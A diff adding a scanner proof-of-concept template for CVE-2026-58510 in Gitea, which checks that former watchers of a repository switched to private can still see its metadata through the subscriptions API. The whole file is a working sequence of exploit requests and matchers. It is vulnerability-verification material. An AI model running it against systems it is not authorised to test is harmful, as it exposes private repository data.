@@ -1,0 +1,71 @@
+[info]
+author = "ave"
+description = "验证 Gitea API 将公有仓库改为私有时，未清理关注记录导致原关注者仍可见私有仓库元数据"
+id = "POC-AVE-2026-0683"
+name = "CVE-2026-58510 PoC"
+severity = "medium"
+tags = ["ave-2026-0683"]
+vuln_id = [
+    "CVE-2026-58510",
+    "AVE-2026-0683",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/api/v1/repos/{{Owner}}/{{Repo}}/subscription"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "token {{TokenB}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "PATCH"
+path = "/api/v1/repos/{{Owner}}/{{Repo}}"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"private": true}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "token {{TokenA}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/v1/user/subscriptions"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "token {{TokenB}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["{{Repo}}"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"private":true']
